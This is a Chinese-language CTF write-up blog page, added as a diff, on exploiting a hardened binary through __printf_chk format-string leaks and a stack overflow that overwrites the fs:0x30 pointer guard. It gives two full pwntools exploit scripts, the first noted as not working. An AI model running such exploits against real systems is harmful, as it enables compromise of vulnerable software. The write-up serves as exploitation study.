@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="胡言乱语事情起因是旷课去实验室，结果偶遇樊总，和樊总聊着聊着突然听到他来了一句：我这有个有意思的栈题，要不要看看，简单栈溢出。顿时心里发毛，肯定是”简单”栈溢出。 浅查了个壳发现，好家伙保护全开，不愧是”简单”栈溢出 1234567Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出新姿势">
+<meta property="og:url" content="http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/index.html">
+<meta property="og:site_name" content="Xu4n">
+<meta property="og:description" content="胡言乱语事情起因是旷课去实验室，结果偶遇樊总，和樊总聊着聊着突然听到他来了一句：我这有个有意思的栈题，要不要看看，简单栈溢出。顿时心里发毛，肯定是”简单”栈溢出。 浅查了个壳发现，好家伙保护全开，不愧是”简单”栈溢出 1234567Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX e">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/xzs/1649235594434227/7faa737562a11538eeae5d0a500478e411e112b2.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/xzs/1649237918341562/cbbde8cd22c73c81c78e1f928b28e445b876cf4b.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/xzs/1649242642226584/fa6888b725ee766c3decfd976c2e35bf7a6caaef.png">
+<meta property="article:published_time" content="2022-04-06T08:32:17.000Z">
+<meta property="article:modified_time" content="2022-04-06T11:54:36.524Z">
+<meta property="article:author" content="Xu4n">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.lemonprefect.cn/image/hdslb/archive/xzs/1649235594434227/7faa737562a11538eeae5d0a500478e411e112b2.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>栈溢出新姿势</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">home</a></li><!--
+     --><!--
+       --><li><a href="/about/">about</a></li><!--
+     --><!--
+       --><li><a href="/archives/">articles</a></li><!--
+     --><!--
+       --><li><a href="/categories/">category</a></li><!--
+     --><!--
+       --><li><a href="/link/">link</a></li><!--
+     --><!--
+       --><li><a href="/search/">search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/makabaka-yyds/makabaka-yyds.github.io">projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/04/12/%E5%86%85%E6%A0%B8pwn%E5%88%9D%E6%8E%A2%E4%B9%8B%E6%A0%88/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E4%B8%AD%E6%96%AD/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&text=栈溢出新姿势"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&title=栈溢出新姿势"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&is_video=false&description=栈溢出新姿势"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=栈溢出新姿势&body=Check out this article: http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&title=栈溢出新姿势"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&title=栈溢出新姿势"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&title=栈溢出新姿势"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&title=栈溢出新姿势"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&name=栈溢出新姿势&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&t=栈溢出新姿势"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD"><span class="toc-number">1.</span> <span class="toc-text">胡言乱语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">2.1.</span> <span class="toc-text">方法一</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">3.</span> <span class="toc-text">方法二</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        栈溢出新姿势
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Xu4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-06T08:32:17.000Z" itemprop="datePublished">2022-04-06</time>
+        
+        (Updated: <time datetime="2022-04-06T11:54:36.524Z" itemprop="dateModified">2022-04-06</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%96%B0%E5%A7%BF%E5%8A%BF/">新姿势</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="胡言乱语"><a href="#胡言乱语" class="headerlink" title="胡言乱语"></a>胡言乱语</h2><p>事情起因是旷课去实验室，结果偶遇樊总，和樊总聊着聊着突然听到他来了一句：我这有个有意思的栈题，要不要看看，简单栈溢出。顿时心里发毛，肯定是”简单”栈溢出。</p>
+<p>浅查了个壳发现，好家伙保护全开，不愧是”简单”栈溢出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RUNPATH:  &#39;&#x2F;usr&#x2F;lib&#x2F;freelibs&#x2F;amd64&#x2F;2.27-3ubuntu1.2_amd64&#x2F;&#39;</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+<p>然后看看主函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">start_routine</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">56</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  __int64 retaddr; <span class="comment">// [rsp+48h] [rbp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ret_address = (__int64)&amp;retaddr;</span><br><span class="line">  save_ret = retaddr;</span><br><span class="line">  gets(v2);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, v2);</span><br><span class="line">  *(_QWORD *)ret_address = save_ret;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>好家伙，格式化字符串？好家伙，gets 函数？我直接上去就是一个<code>%n$p</code>泄露，结果直接报错，不愧是”简单”栈溢出。</p>
+<p>查了一下<code>__printf_chk</code>，发现它和 printf 还是有区别的：</p>
+<ul>
+<li>不能使用 <code>%x$n</code> 不连续地打印，也就是说如果要使用 <code>%3$n</code>，则必须同时使用 <code>%1$n</code> 和 <code>%2$n</code>。</li>
+<li>在使用 <code>%n</code> 的时候会做一些检查。</li>
+</ul>
+<p>不能跳着泄露地址，那就老老实实用一串<code>%p</code>一个一个泄露呗。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pay = <span class="string">&#x27;%pA%p%p%p%p%p%p%p%p%p%pB%p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;addr:&quot;</span> + <span class="built_in">hex</span>(libcbase)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary)</span><br></pre></td></tr></table></figure>
+<p>就这？canary 和 base 都有了，这不直接栈溢出。</p>
+<p>结果一直不成功，调了一下才发现，卧槽，返回地址在我们覆盖之后，会被改回去。代码里也有，不过一开始没看到哈哈哈。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)ret_address = save_ret;</span><br></pre></td></tr></table></figure>
+<p>又不能栈溢出劫持返回地址，又不能格式化字符串，好家伙，直接给我整不会了，不愧是”简单”栈溢出。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>网上搜发现是 2020 年的国赛原题</p>
+<p>漏洞点是 <code>__printf_chk</code>调用过程中的一个函数 <code>buffered_vfprintf</code>(我的ida里都看不到这个，泪目了，不过调试可以调出来)</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/xzs/1649235594434227/7faa737562a11538eeae5d0a500478e411e112b2.png" alt="20201025203502"></p>
+<p>可以看到，整个过程会将 <code>libcbase+0x3F0990</code> 的内容赋给 rax 寄存器，然后对 rax 进行右移 17 次的操作，再将 rax 和 fs+0x30 地址处异或。最后 call rax。</p>
+<p>这里涉及到一个新寄存器<code>fs</code>，它在栈地址之后的一块区域。所以我们可以通过栈溢出劫持 fs+0x30 ，然后一顿操作 get shell。</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>网上师傅的 exp，直接泄露  <code>libcbase+0x3F0990</code> 的内容，然后右移并和 og 异或，得到的特殊值通过栈溢出放入 fs+0x30 (这个exp没打通，但是我觉得逻辑灰常正确)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/freelibs/amd64/2.27-3ubuntu1.2_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">one = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROR</span>(<span class="params">i,index</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(i)[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment">#print len(tmp)</span></span><br><span class="line">    tmp = (<span class="number">64</span>-<span class="built_in">len</span>(tmp))*<span class="string">&#x27;0&#x27;</span>+tmp</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(index):</span><br><span class="line">        tmp = tmp[-<span class="number">1</span>]+tmp[:-<span class="number">1</span>]</span><br><span class="line">	<span class="built_in">print</span> tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc and canary</span></span><br><span class="line">i = <span class="number">7</span>+<span class="number">5</span></span><br><span class="line">p.sendline(<span class="string">&quot;%p&quot;</span>*i)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base =<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x3ED8D0</span></span><br><span class="line">libc.address = libc_base</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libcbase:&quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(i-<span class="number">5</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary =<span class="built_in">int</span>(p.recv(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc+0x3F0988</span></span><br><span class="line">payload = <span class="string">&#x27;%p&#x27;</span>*<span class="number">6</span>+<span class="string">&#x27;%s&#x27;</span>+<span class="string">&#x27;aa&#x27;</span>+p64(libc.address+<span class="number">0x3F0988</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)	</span><br><span class="line"></span><br><span class="line"><span class="comment">#overflow and getshell</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">a = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;a:&quot;</span> + <span class="built_in">hex</span>(a)</span><br><span class="line">b = ROR(a,<span class="number">0x11</span>)</span><br><span class="line">c = b ^ libc.address+one[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;b:&quot;</span> + <span class="built_in">hex</span>(b)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;c:&quot;</span> + <span class="built_in">hex</span>(c)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;og:&quot;</span> + <span class="built_in">hex</span>(libc.address+one[<span class="number">2</span>])</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span>+p64(canary)</span><br><span class="line">payload = payload.ljust(<span class="number">0x850</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span>+p64(c)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>樊总的方法，灰常巧妙，调试的过程中在 <code>call rax</code> 前几行下断点，步过完<code>ror    rax, 0x11</code>之后直接查看 rax 寄存器的值，也就是右移后的结果</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/xzs/1649237918341562/cbbde8cd22c73c81c78e1f928b28e445b876cf4b.png" alt="image-20220406173838151"></p>
+<p>之后再拿这个结果和 fs:30 处异或，得到异或值，再将其减去基地址，得到偏移<code>0x401c90</code>，直接反其道行之</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/xzs/1649242642226584/fa6888b725ee766c3decfd976c2e35bf7a6caaef.png" alt="image-20220406185722060"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;%p%p%p%p%p%p%p%p%p%p%pC:%p%pL:%p%p%p%p%pS:%p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;C:&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;canary = &quot;</span>+<span class="built_in">hex</span>(canary)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;L:&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x3f86db</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;S:&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;stack = &quot;</span>+<span class="built_in">hex</span>(stack)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;%p%p%p%p%p%p%p%p%p%pRand%s&#x27;</span>.ljust(<span class="number">0x30</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(libc_base-<span class="number">0x900</span>+<span class="number">0x30</span>))<span class="comment">#p64(libc_base-0x900+0x30))p64(libc_base+0x832770))</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Rand&#x27;</span>)</span><br><span class="line">rand = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;rand = &quot;</span>+<span class="built_in">hex</span>(rand)</span><br><span class="line">key = (rand^(libc_base + <span class="number">0x401c90</span>))&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">one = key^(libc_base + <span class="number">0x10a45c</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;key = &quot;</span>+<span class="built_in">hex</span>(key)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;one = &quot;</span>+<span class="built_in">hex</span>(one)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + p64(canary)</span><br><span class="line">payload = payload.ljust(<span class="number">0x880</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(one)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/about/">about</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/categories/">category</a></li>
+         
+          <li><a href="/link/">link</a></li>
+         
+          <li><a href="/search/">search</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/makabaka-yyds/makabaka-yyds.github.io">projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD"><span class="toc-number">1.</span> <span class="toc-text">胡言乱语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">2.1.</span> <span class="toc-text">方法一</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">3.</span> <span class="toc-text">方法二</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&text=栈溢出新姿势"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&title=栈溢出新姿势"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&is_video=false&description=栈溢出新姿势"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=栈溢出新姿势&body=Check out this article: http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://makabaka-yyds.github.io/2022/04/06/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%96%B0%E5%A7%BF%E5%8A%BF/&title=栈溢出新姿势"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
